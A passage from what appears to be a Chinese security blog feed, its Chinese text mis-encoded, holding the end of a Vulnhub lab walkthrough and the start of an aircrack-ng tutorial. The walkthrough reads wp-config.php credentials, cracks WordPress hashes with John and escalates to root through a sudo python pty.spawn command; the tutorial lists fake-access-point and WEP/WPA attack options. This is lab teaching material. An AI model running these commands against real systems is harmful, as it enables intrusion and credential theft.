¹ç›®å½•æŸ¥æ‰¾</li><li><code>*</code>ä¸ºé€šé…ç¬¦ï¼Œè¡¨ç¤ºæ–‡ä»¶åä¸­å«æœ‰flagå­—ç¬¦ä¸²</li><li>2ä¸ºé”™è¯¯è¾“å‡ºï¼Œ&#x2F;dev&#x2F;nullç‰¹æ®Šè®¾å¤‡ç”¨äºä¸¢å¼ƒæ‰€æœ‰æ•°æ®ã€‚<code>2&gt;/dev/null</code>è¡¨ç¤ºå¿½ç•¥æ‰€æœ‰é”™è¯¯ä¿¡æ¯</li></ul></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155524561.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155524561.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰¾åˆ°flag2:&#x3D;&#x3D;flag2{fc3fd58dcdad9ab23faca6e9a36e581c}&#x3D;&#x3D;</p><h4 id="ç™»å½•Mysql"><a href="#ç™»å½•Mysql" class="headerlink" title="ç™»å½•Mysql"></a>ç™»å½•Mysql</h4><p>æŸ¥çœ‹Mysqlæ˜¯å¦åœ¨è¿è¡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep mysql</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160053324.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160053324.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆ‡æ¢åˆ°wordpressç›®å½•ï¼Œå‘ç°configé…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/wordpress</span><br><span class="line"><span class="built_in">cat</span> wp-config.php</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160527025.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160527025.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰¾åˆ°æ•°æ®åº“è´¦å·rootï¼Œå¯†ç R@v3nSecurityã€‚Mysqlç™»å½•</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160628125.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160628125.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŸ¥çœ‹mysqlæ•°æ®åº“ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160758564.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160758564.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·å–æ•°æ®åº“çš„flag3ï¼Œflag4ï¼š</p><p>åœ¨wordpress.wp_postsé‡Œé¢æ‰¾åˆ°äº†flag3å’Œflag4</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161015000.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161015000.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>&#x3D;&#x3D;flag3{afc01ab56b50591e7dccf93122770cd2}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag4{715dea6c055b9fe3337544932f2941ce}&#x3D;&#x3D;</p><h4 id="æ•°æ®åº“ææƒ"><a href="#æ•°æ®åº“ææƒ" class="headerlink" title="æ•°æ®åº“ææƒ"></a>æ•°æ®åº“ææƒ</h4><p>åœ¨wordpress.wp_usersé‡Œæ‰¾åˆ°äº†ä¸¤ç»„æ•°æ®åº“è´¦å·å’Œå¯†ç </p><p>ç”¨æˆ·ååˆ†åˆ«ä¸º<code>michael</code>å’Œ<code>steven</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161341869.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161341869.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯†ç åŠ å¯†åå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0</span><br><span class="line">steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/</span><br></pre></td></tr></table></figure><ul><li>johnè§£å¯†ï¼š</li></ul><p>æŠŠä¸Šé¢<code>steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/</code>å†™è¿›1.txtï¼Œä½¿ç”¨johnå·¥å…·è§£å¯†ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162424167.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162424167.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰¾åˆ°stevenå¯†ç pink84</p><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>ä½¿ç”¨<strong>python ptyææƒ</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p>michaelç”¨æˆ·è¿›è¡Œpythonææƒæ—¶ï¼Œç”±äºmichaelç”¨æˆ·æ²¡æœ‰è¢«èµ‹äºˆsudoæ‰§è¡Œpythonçš„æƒé™ï¼Œæ‰€ä»¥ææƒå¤±è´¥ï¼Œå¹¶ä¸”è¯¥äº‹ä»¶è¿˜è¢«è®°å½•äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162718424.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162718424.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>sshç™»å½•stevenä¹‹åå†å°è¯•ææƒï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh steven@192.168.101.135</span><br><span class="line">sudo python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162930601.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162930601.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>stevenæ˜¯å…·æœ‰python sudoæƒé™çš„ï¼Œåœ¨sudoersé‡Œå­˜åœ¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steven ALL=(ALL) NOPASSWD: /usr/bin/python</span><br></pre></td></tr></table></figure><p>æˆäºˆæ™®é€šç”¨æˆ·ä»¥rootæƒé™æ‰§è¡ŒPythonè„šæœ¬ï¼ˆå®æˆ˜ç”¨ä¸äº†ä¸€ç‚¹ï¼‰</p><p>ç”¨findå‘½ä»¤æˆ–è€…ç›´æ¥æ‰¾ï¼Œåœ¨~ç›®å½•ä¸‹ä¹Ÿèƒ½æ‰¾åˆ°flag4</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626163116227.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626163116227.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ¬æ¬¡æ¸—é€æµ‹è¯•å®Œæ¯•</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— çº¿æ”»å‡»ä¹‹aircrack-ng</title>
      <link href="/2023/06/10/wu-xian-gong-ji-aircrack-ng/"/>
      <url>/2023/06/10/wu-xian-gong-ji-aircrack-ng/</url>
      
        <content type="html"><![CDATA[<h1 id="æ— çº¿æ”»å‡»ä¹‹aircrack-ngå¥—ä»¶"><a href="#æ— çº¿æ”»å‡»ä¹‹aircrack-ngå¥—ä»¶" class="headerlink" title="æ— çº¿æ”»å‡»ä¹‹aircrack-ngå¥—ä»¶"></a>æ— çº¿æ”»å‡»ä¹‹aircrack-ngå¥—ä»¶</h1><h2 id="ä¸€ã€aircrack-ngç®€ä»‹"><a href="#ä¸€ã€aircrack-ngç®€ä»‹" class="headerlink" title="ä¸€ã€aircrack-ngç®€ä»‹"></a>ä¸€ã€aircrack-ngç®€ä»‹</h2><p>Aircrack- ng æ˜¯ä¸€ä¸ªå®Œæ•´çš„å·¥å…·å¥—ä»¶ï¼Œä»¥è¯„ä¼° WiFi ç½‘ç»œçš„å®‰å…¨æ€§ã€‚å®ƒç€é‡äºWiFi å®‰å…¨çš„ä¸åŒé¢†åŸŸï¼š </p><p>ç›‘è§†ï¼šæ•°æ®åŒ…æ•è·å¹¶å°†æ•°æ®å¯¼å‡ºåˆ°æ–‡æœ¬æ–‡ä»¶ï¼Œä»¥ä¾›ç¬¬ä¸‰æ–¹å·¥å…·è¿›è¡Œè¿›ä¸€æ­¥å¤„ç† </p><p>æ”»å‡»ï¼šé€šè¿‡æ•°æ®åŒ…æ³¨å…¥æ¥é‡æ”¾æ”»å‡»ï¼Œå–æ¶ˆèº«ä»½éªŒè¯ï¼Œä¼ªé€ çš„æ¥å…¥ç‚¹å’Œå…¶ä»–æ”»å‡» </p><p>æµ‹è¯•ï¼šæ£€æŸ¥ WiFi å¡å’Œé©±åŠ¨ç¨‹åºåŠŸèƒ½ï¼ˆæ•è·å’Œæ³¨å…¥ï¼‰ </p><p>ç ´è§£ï¼šWEP å’Œ WPA PSKï¼ˆWPA 1 å’Œ 2ï¼‰ </p><p>æ‰€æœ‰å·¥å…·éƒ½æ˜¯å‘½ä»¤è¡Œï¼Œå…è®¸è¿›è¡Œå¤§é‡è„šæœ¬ç¼–å†™ã€‚è®¸å¤š GUI éƒ½åˆ©ç”¨äº†æ­¤åŠŸèƒ½ã€‚å®ƒä¸»è¦é€‚ç”¨äº Linuxã€‚ </p><h2 id="äºŒã€aircrack-ngå¸¸ç”¨å·¥å…·ä»‹ç»"><a href="#äºŒã€aircrack-ngå¸¸ç”¨å·¥å…·ä»‹ç»" class="headerlink" title="äºŒã€aircrack-ngå¸¸ç”¨å·¥å…·ä»‹ç»"></a>äºŒã€aircrack-ngå¸¸ç”¨å·¥å…·ä»‹ç»</h2><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps47.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps47.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><h3 id="ï¼ˆä¸€ï¼‰-Airbase-ng"><a href="#ï¼ˆä¸€ï¼‰-Airbase-ng" class="headerlink" title="ï¼ˆä¸€ï¼‰ Airbase-ng"></a>ï¼ˆä¸€ï¼‰ Airbase-ng</h3><p>Airbase-ng æ˜¯å¤šåŠŸèƒ½å·¥å…·ï¼Œå®ç°çš„ä¸»è¦æ€æƒ³æ˜¯ï¼Œæ—¨åœ¨æ”»å‡»å®¢æˆ·ç«¯ï¼Œé¼“åŠ±å®¢æˆ·ç«¯ä¸ä¼ªé€ çš„ AP å…³è”ï¼Œè€Œä¸æ˜¯é˜»æ­¢ä»–ä»¬è®¿é—®çœŸå®çš„ APã€‚ä¸»è¦åŠŸèƒ½æœ‰ï¼š  </p><p>å®æ–½ Caffe Latte WEP å®¢æˆ·ç«¯æ”»å‡»  </p><p>å®æ–½ Hirte WEP å®¢æˆ·ç«¯æ”»å‡»  </p><p>èƒ½å¤Ÿæ•è· WPA &#x2F; WPA2 æ¡æ‰‹çš„èƒ½åŠ› </p><p>å¯ä»¥å……å½“ä¸´æ—¶è®¿é—®ç‚¹ </p><p>èƒ½å¤Ÿå……å½“å®Œæ•´çš„æ¥å…¥ç‚¹ </p><p>èƒ½å¤ŸæŒ‰ SSID æˆ–å®¢æˆ·ç«¯ MAC åœ°å€è¿›è¡Œè¿‡æ»¤ </p><p>èƒ½å¤Ÿå¤„ç†å’Œé‡æ–°å‘é€æ•°æ®åŒ… </p><p>èƒ½å¤ŸåŠ å¯†å‘é€çš„æ•°æ®åŒ…å’Œè§£å¯†æ¥æ”¶çš„æ•°æ®åŒ… </p><h4 id="1ã€-è¯­æ³•æ ¼å¼"><a href="#1ã€-è¯­æ³•æ ¼å¼" class="headerlink" title="1ã€ è¯­æ³•æ ¼å¼"></a>1ã€ è¯­æ³•æ ¼å¼</h4><p>ã€è¯­æ³•ã€‘airbase-ng &lt;option&gt; </p><p>Optionï¼š </p><p>-a bssidï¼šè®¾ç½®æ¥å…¥ç‚¹ MAC åœ°å€ </p><p>-i ifaceï¼šä»æ­¤æ¥å£æ•è·æ•°æ®åŒ… </p><p>-w WEP keyï¼šä½¿ç”¨æ­¤ WEP å¯†é’¥åŠ å¯† &#x2F; è§£å¯†æ•°æ®åŒ… </p><p>-h MACï¼šç”¨äº MITM æ¨¡å¼çš„æº mac </p><p>-f disallowï¼šç¦æ­¢æŒ‡å®šçš„å®¢æˆ·ç«¯ MACï¼ˆé»˜è®¤å€¼ï¼šå…è®¸ï¼‰ </p><p>-W 0 | 1ï¼š[ä¸] åœ¨ä¿¡æ ‡ 0 | 1 ä¸­è®¾ç½® WEP æ ‡å¿—ï¼ˆé»˜è®¤ï¼šè‡ªåŠ¨ï¼‰ </p><p>-qï¼šå®‰é™ï¼ˆä¸æ‰“å°ç»Ÿè®¡ä¿¡æ¯ï¼‰ </p><p>-vï¼šè¯¦ç»†ï¼ˆæ‰“å°æ›´å¤šæ¶ˆæ¯ï¼‰ï¼ˆé•¿â€“è¯¦ç»†ï¼‰ </p><p>-Mï¼š[æŒ‡å®šçš„] å®¢æˆ·ç«¯å’Œ bssids ä¹‹é—´çš„ MITMï¼ˆå½“å‰æœªå®ç°ï¼‰ </p><p>-Aï¼šç‚¹å¯¹ç‚¹æ¨¡å¼ (å…è®¸å…¶ä»–å®¢æˆ·ç«¯å¯¹ç­‰)(Longâ€“ç‚¹å¯¹ç‚¹)ã€‚ </p><p>-Y in | out |Bothï¼šå¤–éƒ¨æ•°æ®åŒ…å¤„ç† </p><p>-c channelï¼šè®¾ç½® AP è¿è¡Œçš„é€šé“ </p><p>-Xï¼šéšè—çš„ ESSIDï¼ˆé•¿â€“éšè—ï¼‰ </p><p>-sï¼šå¼ºåˆ¶å…±äº«å¯†é’¥è®¤è¯ </p><p>-Sï¼šè®¾ç½®å…±äº«å¯†é’¥æŒ‘æˆ˜é•¿åº¦ï¼ˆé»˜è®¤å€¼ï¼š128ï¼‰ </p><p>-Lï¼šCaffe-Latte æ”»å‡»ï¼ˆé•¿â€“ æ‹¿é“å’–å•¡ï¼‰ </p><p>-Nï¼šHirte æ”»å‡»ï¼ˆcfrag æ”»å‡»ï¼‰ï¼Œé’ˆå¯¹ wep å®¢æˆ·ç«¯åˆ›å»º arp è¯·æ±‚ï¼ˆlong -cfragï¼‰-x nbppsï¼šæ¯ç§’çš„æ•°æ®åŒ…æ•°ï¼ˆé»˜è®¤å€¼ï¼š100ï¼‰ </p><p>-yï¼šç¦ç”¨å¯¹å¹¿æ’­æ¢æµ‹çš„å“åº” </p><p>-0ï¼šè®¾ç½®æ‰€æœ‰ WPAï¼ŒWEPï¼Œæ‰“å¼€æ ‡ç­¾ã€‚ä¸èƒ½ä¸ - z å’Œ - Z ä¸€èµ·ä½¿ç”¨ </p><p>-z typeï¼šè®¾ç½® WPA1 æ ‡ç­¾ã€‚1 &#x3D; WEP40 2 &#x3D; TKIP 3 &#x3D; WRAP 4 &#x3D; CCMP 5 &#x3D; WEP104 </p><p>-Z type :ï¼šä¸ - z ç›¸åŒï¼Œä½†é€‚ç”¨äº WPA2 </p><p>-V type :ï¼šå‡ EAPOL 1 &#x3D; MD5 2 &#x3D; SHA1 3 &#x3D; è‡ªåŠ¨ </p><p>-F prefixï¼šå°†æ‰€æœ‰å·²å‘é€å’Œå·²æ¥æ”¶çš„å¸§å†™å…¥ pcap æ–‡ä»¶ </p><p>-Pï¼šå³ä½¿æŒ‡å®š ESSIDï¼Œä¹Ÿå“åº”æ‰€æœ‰æ¢æµ‹ </p><p>-I intervalï¼šä»¥æ¯«ç§’ä¸ºå•ä½è®¾ç½®ä¿¡æ ‡é—´éš”å€¼ </p><p>-C ç§’ï¼šå¯ç”¨ä¿¡æ ‡æ¢æµ‹çš„ ESSID å€¼ï¼ˆéœ€è¦ - Pï¼‰ </p><p>è¿‡æ»¤å™¨é€‰é¡¹ï¼š </p><p>-bssid ï¼šè¦ç­›é€‰ &#x2F; ä½¿ç”¨çš„ bssid (ç®€ç§° - b) </p><p>-bssids ï¼šä»è¯¥æ–‡ä»¶è¯»å– BSSID åˆ—è¡¨ (j-B) </p><p>-client ï¼šå®¢æˆ·ç«¯çš„ MAC æ¥å—ï¼ˆçŸ­ - dï¼‰ </p><p>-clients ï¼šä»è¯¥æ–‡ä»¶ä¸­è¯»å– Mac åˆ—è¡¨ (ï¼ˆçŸ­ - Dï¼‰ </p><p>-essid ï¼šæŒ‡å®šå•ä¸ª ESSIDï¼ˆçŸ­ - eï¼‰ </p><p>-essids ï¼šä»è¯¥æ–‡ä»¶ä¸­è¯»å– ESSID åˆ—è¡¨ (çŸ­ - E) </p><h4 id="2ã€-ä½¿ç”¨ç¤ºä¾‹"><a href="#2ã€-ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="2ã€ ä½¿ç”¨ç¤ºä¾‹"></a>2ã€ ä½¿ç”¨ç¤ºä¾‹</h4><p>ï¼ˆ1ï¼‰airbase-ng -c 9 -e WiFiClass -N -W 1 wlan0 </p><p>-c 9 æŒ‡å®šé€šé“ </p><p>-e teddy è¿‡æ»¤å•ä¸ª SSID </p><p>-N æŒ‡å®š Hirte æ”»å‡» </p><p>-W 1 å¼ºåˆ¶ä¿¡æ ‡æŒ‡å®š WEP </p><p>rausb0 æŒ‡å®šè¦ä½¿ç”¨çš„æ— çº¿æ¥å£ </p><p>ï¼ˆ2ï¼‰æ•è· WPA æ¡æ‰‹åŒ… </p><p>airbase-ng -c 9 -e WiFiClass -z 2 -W 1 wlan0 </p><p>-c 9 æŒ‡å®šé€šé“ </p><p>-e teddy è¿‡æ»¤å•ä¸ª SSID </p><p>-z 2 æŒ‡å®š TKIP </p><p>-W 1 è®¾ç½® WEP æ ‡å¿—ï¼Œå› ä¸ºæœ‰äº›å®¢æˆ·æœºæ²¡æœ‰å®ƒã€‚rausb0 æŒ‡å®šè¦ä½¿ç”¨çš„æ— çº¿æ¥å£ </p><p>å¿…é¡»æ ¹æ®å®¢æˆ·ç«¯ä½¿ç”¨çš„å¯†ç æ¥æ›´æ”¹ - z ç±»å‹ã€‚TKIP æ˜¯ WPA çš„å…¸å‹ä»£è¡¨ã€‚ </p><h3 id="ï¼ˆäºŒï¼‰-Airmon-ng"><a href="#ï¼ˆäºŒï¼‰-Airmon-ng" class="headerlink" title="ï¼ˆäºŒï¼‰ Airmon-ng"></a>ï¼ˆäºŒï¼‰ Airmon-ng</h3><p>å¯ç”¨äºåœ¨æ— çº¿æ¥å£ä¸Šå¯ç”¨ç›‘è§†æ¨¡å¼ã€‚å®ƒä¹Ÿå¯ä»¥ç”¨äºä»ç›‘è§†æ¨¡å¼è¿”å›åˆ°æ‰˜ç®¡æ¨¡å¼ã€‚è¾“å…¥ä¸å¸¦å‚æ•°çš„ airmon-ng å‘½ä»¤å°†æ˜¾ç¤ºæ¥å£çŠ¶æ€ã€‚<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps48.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps48.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="1ã€è¯­æ³•æ ¼å¼"><a href="#1ã€è¯­æ³•æ ¼å¼" class="headerlink" title="1ã€è¯­æ³•æ ¼å¼"></a>1ã€è¯­æ³•æ ¼å¼</h4><p>ã€è¯­æ³• 1ã€‘airmon-ng &lt;start|stop&gt; &lt;interface&gt; [channel] </p><p>ã€è¯­æ³• 2ã€‘airmon-ng &lt;check&gt; [kill] </p><p>start|stopï¼šå¯åŠ¨æˆ–åœæ­¢ç›‘å¬æ¨¡å¼ </p><p>interfaceï¼šç›‘å¬æ¥å£ </p><p>channelï¼šç›‘å¬ä¿¡é“ </p><p>checkï¼šåˆ—å‡ºæ‰€æœ‰å¯èƒ½å¹²æ‰°æ— çº¿ç½‘å¡çš„ç¨‹åº </p><p>killï¼šç»“æŸæ‰€æœ‰å¯èƒ½å¹²æ‰°æ— çº¿ç½‘å¡çš„è¿›ç¨‹ </p><h4 id="2ã€ä½¿ç”¨ç¤ºä¾‹"><a href="#2ã€ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="2ã€ä½¿ç”¨ç¤ºä¾‹"></a>2ã€ä½¿ç”¨ç¤ºä¾‹</h4><p>ï¼ˆ1ï¼‰åˆ—å‡ºæ‰€å¹²æ‰°æ— çº¿ç½‘å¡å·¥ä½œç¨‹åºã€ç»“æŸæ‰€æœ‰å¹²æ‰°è¿›ç¨‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps49.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps49.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps50.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps50.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>æ³¨æ„ï¼škill åï¼Œç½‘ç»œç®¡ç†å™¨è¿›ç¨‹å°†è¢«ç»“æŸï¼Œè‹¥éœ€è¦é‡æ–°å¯ç”¨ï¼Œåˆ™ä½¿ç”¨å‘½ä»¤ï¼š </p><p>systemctl enable â€“now NetworkManager</p><p>ï¼ˆ2ï¼‰å¯ç”¨ç›‘å¬æ¨¡å¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps51.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps51.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ3ï¼‰åœç”¨ç›‘å¬æ¨¡å¼ </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps52.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps52.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><h3 id="ï¼ˆä¸‰ï¼‰-Airodump-ng"><a href="#ï¼ˆä¸‰ï¼‰-Airodump-ng" class="headerlink" title="ï¼ˆä¸‰ï¼‰ Airodump-ng"></a>ï¼ˆä¸‰ï¼‰ Airodump-ng</h3><p>Airodump-ng ç”¨äºåŸå§‹ 802.11 å¸§çš„æ•°æ®åŒ…æ•è·ï¼Œå°¤å…¶é€‚ç”¨äºæ”¶é›† WEP IVï¼ˆåˆå§‹åŒ–çŸ¢é‡ï¼‰ï¼Œä»¥ç”¨äºå°†å…¶ä¸ aircrack-ng ä¸€èµ·ä½¿ç”¨ </p><h4 id="1ã€è¯­æ³•æ ¼å¼-1"><a href="#1ã€è¯­æ³•æ ¼å¼-1" class="headerlink" title="1ã€è¯­æ³•æ ¼å¼"></a>1ã€è¯­æ³•æ ¼å¼</h4><p>ã€è¯­æ³•ã€‘airodump-ng &lt;options&gt; &lt;interface&gt;[,&lt;interface&gt;,â€¦] </p><p>Optionï¼š </p><p>-Hï¼Œâ€“helpï¼šæ‰“å°å¸®åŠ©ä¿¡æ¯ç•Œé¢ </p><p>-iï¼Œâ€“ivsï¼šåªä¿å­˜ IVs(åªå¯¹ç ´è§£æœ‰ç”¨).å¦‚æœæŒ‡å®šäº†æ­¤é€‰é¡¹ï¼Œåˆ™å¿…é¡»æä¾›è½¬å‚¨å‰ç¼€(â€“write é€‰é¡¹) </p><p>-g,â€“gpsdï¼šæŒ‡ç¤º airodump-ng åº”è¯¥å°è¯•ä½¿ç”¨ GPSd è·å–åæ ‡ã€‚ </p><p>-w &lt;prefix&gt;,â€“write &lt;prefix&gt;ï¼šè¦ä½¿ç”¨çš„è½¬å‚¨æ–‡ä»¶å‰ç¼€ã€‚å¦‚æœæ²¡æœ‰æä¾›è¿™ä¸ªé€‰é¡¹ï¼Œå®ƒå°†åªåœ¨å±å¹•ä¸Šæ˜¾ç¤ºæ•°æ®ã€‚åœ¨è¯¥æ–‡ä»¶æ—è¾¹å°†åˆ›å»ºä¸æ•è·æ–‡ä»¶ç›¸åŒæ–‡ä»¶åçš„ CSV æ–‡ä»¶ </p><p>-e,â€“beaconsï¼šå®ƒå°†è®°å½•æ‰€æœ‰çš„ä¿¡æ ‡åˆ° cap æ–‡ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒåªè®°å½•æ¯ä¸ªç½‘ç»œçš„ä¸€ä¸ªä¿¡æ ‡ </p><p>-u &lt;secs&gt;,â€“update &lt;secs&gt;ï¼šå»¶è¿Ÿ&lt;ç§’&gt;æ˜¾ç¤ºæ›´æ–°ä¹‹é—´çš„å»¶è¿Ÿ(é»˜è®¤ä¸º 1 ç§’)ã€‚é€‚ç”¨äº CPU é€Ÿåº¦æ…¢çš„æƒ…å†µã€‚ </p><p>-showackï¼šæ‰“å° ACK &#x2F; CTS &#x2F; RTS ç»Ÿè®¡æ•°æ®ã€‚æœ‰åŠ©äºè°ƒè¯•å’Œä¸€èˆ¬çš„æ³¨å…¥ä¼˜åŒ–ã€‚å®ƒè¡¨æ˜å¦‚æœä½ æ³¨å…¥ï¼Œæ³¨å…¥å¤ªå¿«ï¼Œåˆ°è¾¾ APï¼Œå¸§æ˜¯æœ‰æ•ˆçš„åŠ å¯†å¸§ã€‚å…è®¸æ¢æµ‹â€œéšè—â€çš„ç«™ï¼Œå› ä¸ºå®ƒä»¬å¤ªè¿œï¼Œæ— æ³•æ•è·é«˜æ¯”ç‰¹ç‡å¸§ï¼Œå› ä¸º ACK å¸§ä»¥æ¯ç§’ 1Mbps çš„é€Ÿåº¦å‘é€ã€‚-hï¼šéšè—çš„ç«™ç‚¹. </p><p>â€“berlin &lt;secs&gt;ï¼šå½“ä¸å†æ¥æ”¶åˆ°ä»»ä½•æ•°æ®åŒ…æ—¶ï¼Œä»å±å¹•ä¸Šåˆ é™¤ AP&#x2F;client ä¹‹å‰çš„æ—¶é—´(é»˜è®¤ä¸º120 ç§’)ã€‚ </p><p>-c &lt;channel&gt;[,&lt;channel&gt;[,â€¦]],â€“channel &lt;channel&gt;[,&lt;\channel&gt;[,â€¦]]ï¼šæŒ‡å‡ºè¦ç›‘å¬çš„é¢‘é“ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œairodump-ng åœ¨æ‰€æœ‰ 2.4GHz é€šé“ä¸Šè·³è½¬ã€‚ </p><p>-b &lt;abg&gt;,â€“band &lt;abg&gt;ï¼šæŒ‡å‡º airodump-ng åº”è¯¥è·³çš„æ³¢æ®µã€‚å®ƒå¯ä»¥æ˜¯â€œaâ€ã€â€œbâ€å’Œâ€œgâ€å­—æ¯çš„ç»„åˆ(â€œbâ€å’Œâ€œgâ€ä½¿ç”¨ 2.4GHzï¼Œâ€œaâ€ä½¿ç”¨ 5GHz)ã€‚ä¸â€”â€”é€šé“é€‰é¡¹ä¸å…¼å®¹ã€‚ </p><p>-s &lt;method&gt;,â€“cswitch &lt;method&gt;ï¼šå®šä¹‰ airodump-ng åœ¨ä½¿ç”¨å¤šä¸ªç½‘å¡æ—¶è®¾ç½®é€šé“çš„æ–¹å¼ã€‚ æœ‰æ•ˆå€¼:0 